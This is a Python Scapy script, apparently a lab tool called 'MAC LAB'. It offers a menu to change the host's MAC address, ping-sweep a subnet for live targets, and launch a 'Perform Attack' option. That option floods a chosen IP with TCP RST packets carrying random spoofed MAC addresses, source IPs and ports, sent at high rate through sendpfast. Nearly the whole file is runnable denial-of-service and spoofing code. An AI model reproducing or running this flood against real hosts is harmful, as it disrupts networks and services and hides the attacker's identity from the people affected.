import subprocess
import random
import threading
import re
import ipaddress
import logging
import sys
from scapy.all import *

DEFAULT_SPEED = 5000  
packet_counter_lock = threading.Lock()
packet_counter = 0

def get_random_mac_address():
    return ':'.join(format(random.randint(0x00, 0xff), '02x') for _ in range(6))

def random_ip_generator():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

def random_port_generator():
    return random.randint(1500, 65530)

def list_network_interfaces():
    try:
        result = subprocess.check_output(['ip', 'link'], universal_newlines=True)
        return result
    except subprocess.CalledProcessError as error:
        print(f"Error code: {error.returncode}")
        print(f"An error occurred: {error.output}")
        return None

def reset_network_interface(interface):
    try:
        subprocess.check_output(["ip", "link", "set", "dev", interface, "down"])
        print(f"{interface} interface has been brought down.")
        
        subprocess.check_output(["ip", "link", "set", "dev", interface, "up"])
        print(f"{interface} interface has been brought up.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while resetting the interface: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def select_network_interface():
    interfaces = list_network_interfaces()
    if interfaces is None:
        print("Interfaces could not be listed.")
        return None

    print("Available Interfaces:")
    interface_list = re.findall(r'^\d+: (\S+):', interfaces, re.MULTILINE)
    for i, interface in enumerate(interface_list, 1):
        print(f"{i}. {interface}")

    while True:
        try:
            selection = int(input("Select an interface (1 - n): "))
            if 1 <= selection <= len(interface_list):
                return interface_list[selection - 1]
            else:
                print("Invalid selection. Please choose a valid number.")
        except ValueError:
            print("Invalid input. Please enter a number.")

def generate_packets(target_ip, packet_count):
    packets = []
    for _ in range(packet_count):
        smac = get_random_mac_address()
        dmac = get_random_mac_address()
        sip = random_ip_generator()
        dip = target_ip
        sport = random_port_generator()
        dport = random_port_generator()

        tcp_packet = Ether(src=smac, dst=dmac) / \
                     IP(src=sip, dst=dip) / \
                     TCP(sport=sport, dport=dport, flags='R', options=[('Timestamp', (0, 0))])
        packets.append(tcp_packet)
    return packets

def send(pkts, iface=None, speed=DEFAULT_SPEED):
    try:
        sendpfast(pkts, iface=iface, pps=speed)
        print("Packets successfully sent.")
    except Exception as e:
        print(f"Packets could not be sent. Error: {e}")

def perform_attack(target_ip, packet_count, iface):
    packets = generate_packets(target_ip, packet_count)
    send(packets, iface, DEFAULT_SPEED)

def change_mac(interface, new_mac):
    try:
        subprocess.check_output(["ip", "link", "set", "dev", interface, "down"])
        subprocess.check_output(["ip", "link", "set", "dev", interface, "address", new_mac])
        subprocess.check_output(["ip", "link", "set", "dev", interface, "up"])
        print(f"{interface} interface's MAC address has been changed to {new_mac}.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while changing MAC address: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

def list_target_ips(network='192.168.1.0/24', stop_event=None):
    try:
        net = ipaddress.ip_network(network)
        live_ips = []

        print("IP Scanning... Press 'q' and Enter to stop scanning.")

        for ip in net.hosts():
            if stop_event and stop_event.is_set():
                break
            response = sr1(IP(dst=str(ip))/ICMP(), timeout=1, verbose=0)
            if response:
                live_ips.append(str(ip))
                print(f"Found IP: {ip}")

        if not live_ips:
            print("No live IP addresses found in the network.")
            
        print("\nIP scanning completed.")
        
        return live_ips

    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def monitor_keyboard(stop_event):
    while not stop_event.is_set():
        user_input = input()
        if user_input.lower() == 'q':
            print("Stopping IP scan...")
            stop_event.set()
            break

def print_mac_lab_art():
    GREEN = '\033[92m' 
    RESET = '\033[0m'   

    print(GREEN + "\n" + " " * 71)
    print("       .___  ___.      ___       ______  __          ___      .______   ")
    print("       |   \/   |     /   \     /      ||  |        /   \     |   _  \  ")
    print("       |  \  /  |    /  ^  \   |  ,----'|  |       /  ^  \    |  |_)  | ")
    print("       |  |\/|  |   /  /_\  \  |  |     |  |      /  /_\  \   |   _  <  ")
    print("       |  |  |  |  /  _____  \ |  `----.|  `----./  _____  \  |  |_)  | ")
    print("       |__|  |__| /__/     \__\ \______||_______/__/     \__\ |______/  ")
    print("                                           DR. Gokhan Akin & Latif Altay")
    print(" " * 71 + RESET)

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def is_valid_network(network):
    try:
        ipaddress.ip_network(network)
        return True
    except ValueError:
        return False

def main():
    try:
        while True:
            print_mac_lab_art()
            print("\n1. List interfaces and change MAC address")
            print("2. Perform Attack")
            print("3. List and select target IP addresses")
            print("4. Reset network interfaces")
            print("5. Exit")

            choice = input("Select an option: ")
            print("")

            if choice == '1':
                interface = select_network_interface()
                if interface:
                    new_mac = get_random_mac_address()
                    change_mac(interface, new_mac)
                print("")
            elif choice == '2':
                target_ip = input("Enter target IP address: ")
                if is_valid_ip(target_ip):
                    packet_count = int(input("Enter number of packets to send: "))
                    iface = select_network_interface()
                    if iface:
                        perform_attack(target_ip, packet_count, iface)
                else:
                    print("Invalid IP address. Please enter a valid IP address.")
                print("")
            elif choice == '3':
                network = input("Enter the network to scan (e.g., 192.168.1.0/24): ")
                if is_valid_network(network):
                    stop_event = threading.Event()
                    keyboard_thread = threading.Thread(target=monitor_keyboard, args=(stop_event,))
                    keyboard_thread.start()
                    ips = list_target_ips(network, stop_event)
                    if ips:
                        print("Found IPs:", ips)
                    keyboard_thread.join()
                else:
                    print("Invalid network. Please enter a valid network.")
                print("")
            elif choice == '4':
                interface = select_network_interface()
                if interface:
                    reset_network_interface(interface)
                print("")
            elif choice == '5':
                print("Exiting...")
                break
            else:
                print("Invalid choice. Please select a valid option.")
                print("")

    except KeyboardInterrupt:
        print("\nProgram interrupted by user.")

if __name__ == '__main__':
    main()